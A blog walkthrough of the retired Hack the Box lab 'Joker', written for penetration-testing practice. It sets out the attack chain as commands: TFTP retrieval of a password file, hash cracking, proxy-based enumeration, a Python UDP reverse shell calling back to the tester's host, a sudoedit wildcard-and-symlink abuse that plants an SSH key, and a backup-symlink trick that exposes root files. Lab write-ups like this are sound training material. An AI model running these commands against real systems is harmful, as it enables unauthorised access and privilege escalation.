<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box Challenge: Joker Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-joker-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-03-30T15:44:04+00:00">March 30, 2018</time><time class="updated" datetime="2025-07-06T19:06:38+00:00">July 6, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “<strong>Joker</strong>” which is lab presented by <strong>Hack the Box</strong> for making online penetration practices according to your experience level. They have collection of vulnerable labs as challenges from beginners to Expert level. HTB have two partitions of lab i.e. Active and retired since we can’t submit write up of any Active lab therefore we have chosen retried joker lab.</span></p>
<p><span style="color: #000000;"><strong>Level: </strong>Intermediate</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> find <strong>user.txt</strong> and <strong>root.txt</strong> file in victim’s machine.</span></p>
<h3><span style="color: #800000;">Initial Reconnaissance and Service Identification</span></h3>
<p><span style="color: #000000;">Since these labs are online available therefore they have static IP. The IP of Joker is <strong>10.10.10.21</strong> so let’s begin with nmap port enumeration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.10.10.21</pre>
<p><span style="color: #000000;">From given below image, you can observe we found port 22, 3128 are open in victim’s network.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-wJ0Nmh1rjQ4/Wr5SAuV-HmI/AAAAAAAAVzw/XUSLUYiKcPYhgcUjmx40FwZXElTgM8-6wCEwYBhgL/s1600/1.png"/></span></p>
<h3><span style="color: #800000;">TFTP Enumeration and Credential Cracking</span></h3>
<p><span style="color: #000000;">After completing the Aggressive scan we use UDP scan to further enumerate the ports and find port 69 and 5355 are open.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ApmN2cEEbKk/Wr5SDLclVpI/AAAAAAAAVz0/2OBg4cISXOU0XRrxNEPg6o5_97OsmAx6gCEwYBhgL/s1600/2.1.png"/></span></p>
<p><span style="color: #000000;">We locate a file named passwords and download it after determining that the target system is using TFTPP. We discover that the file contains a number of hashes.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">tftp 10.10.10.21
tftp &gt; get passwords</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LuIdkKYNJ6M/Wr5SDjYjG4I/AAAAAAAAVz8/4Kwz10DP4UcJt0ATS6x7FeWZ2UylRCXQgCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">After downloading the file we use john the ripper to crack the hashes using rockyou.txt wordlist. We find the password to be “<strong>ihateseafood</strong>” for user “<strong>kalamari</strong>“.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">john --wordlist=/usr/share/wordlists/rockyou.txt passwords</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-FPUuRi3xMZk/Wr5SEeoFA0I/AAAAAAAAV0E/HRsLdy3VaOwmGz20qZbpenN-xyebMJIyACEwYBhgL/s1600/3.png"/></span></p>
<h3><span style="color: #800000;">Proxy Configuration and Web Enumeration</span></h3>
<p><span style="color: #000000;">As we know the target machine is running as squid proxy, we configure our browser to redirect the traffic through the target machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BbvxEj_Uhe8/Wr5SEmBqASI/AAAAAAAAVz0/P_678xS0-ak-jDpWtNo0Nwxw5Jxu83sVgCEwYBhgL/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Now when we try to access the target machine on our browser we are unable to access any page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-vkztseC8AbE/Wr5SFb4Gx8I/AAAAAAAAVz4/ab3cTHkW0ss64eOMWqgMTNZNwUzFpbzyACEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Now as we are running redirecting all the traffic through the proxy server we try to <strong>open localhost</strong> on our browser to check if there are any changes in the behaviour. As soon as we open localhost on our browser we are greeted with a login popup.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-7jsXLJVM6cA/Wr5SE1NkmBI/AAAAAAAAVz4/2iKFFfNyTlsMuJo6aBmwF7AmjfB8_lKnwCEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">We use the password and username we found above by cracking the hashes to login into the page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-cdh2A5t7BSQ/Wr5SFqXxBmI/AAAAAAAAVz8/lL2dnjQppkc_UlGF1-RUt8QRTsegMbsNwCEwYBhgL/s1600/7.png"/></span></p>
<h3><span style="color: #800000;">Gaining Initial Access via Python Console</span></h3>
<p><span style="color: #000000;">We use dirb to enumerate the directories and find /console directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://127.0.0.1 -p 10.10.10.21:3128 -P kalamari:ihateseafood -r</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-mw74aNGAZHs/Wr5SGGdXlpI/AAAAAAAAV0A/cQ-u4ikJL24vpos8LeAWg6zU1s1Hj1FYQCEwYBhgL/s1600/8.1.png"/></span></p>
<p><span style="color: #000000;">When we open the console directory and found a page that acts as an interpreter for python.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oHQq8MD8uWY/Wr5SGOdSmDI/AAAAAAAAV0A/IOsZp9vt86ofyGoKJjlpbxaG86kKhuDtQCEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Now we use python reverse shell to gain access to the target machine but TCP reverse shell doesn’t work on the system so we use UDP reverse shell to gain access of the system.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">import subprocess;subprocess.Popen(["python", "-c", 'import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"10.10.14.3\", 4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"/bin/sh\");s.close()'])</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-EryNlt2PkN4/Wr5SGvij6fI/AAAAAAAAV0E/hjvmudFQNnQKYw3H3u2Dogool1qHTIU6QCEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">We <strong>use socat</strong> to setup our listener as netcat was not able to provide a stable tty shell for us to run our commands.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat file:’tty’,echo=0,raw udp-listen:4444</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UrN879Lwwgw/Wr5SA8ZAR5I/AAAAAAAAVzs/jQmqM0jQ36c74Eqti7yp6JxCY-48QQhfgCEwYBhgL/s1600/10.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation via Sudoedit</span></h3>
<p><span style="color: #000000;">After gaining reverse shell we take a look at the sudoers file. We found that we can run a command called sudoedit on file /var/www/*/*/layout.html as alekos. Sudo edit is a command that can be use to edit any file on the system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ujXJXhpzx8E/Wr5SA1CQkKI/AAAAAAAAV0A/F1T3-WVfq7EF4iZD4bnsMUTFjBsd3ap2wCEwYBhgL/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Enumerating through the directories we find .ssh folder in /home/alekos folder.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8S3MAc_thjE/Wr5SBjlof-I/AAAAAAAAVz8/EVDiGIRdsn8jCpypd1dSunwdsu-zXTfvgCEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Now as the file listed in the sudoers list is using wildcard we can use symlink to link a file that can be edited using sudoedit. As we found the .ssh folder for user alekos we link the authorized_keys with layout.html to edit the authorized_keys and add our keys. So, we can gain access through ssh using our own private key.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /var/www/
cd testing
mkdir test
cd test
ln -s /home/alekos/.ssh/authorized_keys layout.html</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-3pR6E-jfHTY/Wr5SBYTS-hI/AAAAAAAAVzw/qBN38t0ndGsbMNk7rgzceo4ISvxVcQBsQCEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Now we use sudoedit as user alekos to edit alekos’s authorized_keys.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudoedit -u alekos /var/www/testing/test/layout.html</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-RAn4ZwFrjX8/Wr5SBYHmWoI/AAAAAAAAVz0/KluPUqYC8_AcSsX2BsjMSah12FagwV23QCEwYBhgL/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Then, we generate keys on our system so that we can copy the public key into authorized_keys and use our private key to login.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh-keygen</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Aciy4VsNP60/Wr5SCEJRHNI/AAAAAAAAVzw/-RgBariE7P0FyXtDl8rCIQqvqEl1P44cACEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Now we open the public key that we just generated and copy it.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat id_rsa.pub</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xitWXlKJF8M/Wr5SCImC4bI/AAAAAAAAV0A/1ZNkq9652uwIwKoomVx1nHK3c2h9n0qkACEwYBhgL/s1600/16.png"/></span></p>
<p><span style="color: #000000;">We copy it in our target machine and save it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-lLR-1iRQOpE/Wr5SCJnQCcI/AAAAAAAAVz0/4k6YspbqfEEi7LYNXHN6NKyxDOkJvnHhwCEwYBhgL/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Now we use the private key we generated to login through ssh to the target machine. As soon as we login through ssh we find user.txt in the home directory of alekos we open it and find the first flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -i id_rsa alekos@10.10.10.21</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-O8dhx5T8Ozc/Wr5YX-SpAGI/AAAAAAAAV0Q/aVZ18Px06PMjuPMiX09mULTA5gEec-KFgCLcBGAs/s1600/18.png"/></span></p>
<h3><span style="color: #800000;">Capturing Root Flag via Backup Symlink</span></h3>
<p><span style="color: #000000;">We start enumerating the directories. In the backup directory we find a few tape archive files when we extract them we find that it contains the backup for development directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-qJDwRUFQAmE/Wr5SDMQ4QVI/AAAAAAAAVz0/-ghPc7PETwI4EMtPaiEr939qkqeB74OzwCEwYBhgL/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Now we rename the development directory to dev/ and use symlink to link the root directory to the development directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mv development dev/
ln -s root development</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-rvGz27tsEVI/Wr5SD-sc8HI/AAAAAAAAVzw/CZFwEJHzQ0o1whR20HX8iiQrQ4YogYiHgCEwYBhgL/s1600/20.png"/></span></p>
<p><span style="color: #000000;">We then wait for a few minutes for the file to create backup for the new development folder. As the development links to the root folder, it will create a backup for the root folder. Now we open the new tape archive file that we create and find a file called root.txt; we open it and find the final flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-xFhWPRUO1DM/Wr5SEOWFvdI/AAAAAAAAVz0/TbirIJE6Ah4dRPjDa80-dMYo9phPnFkrgCEwYBhgL/s1600/21.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
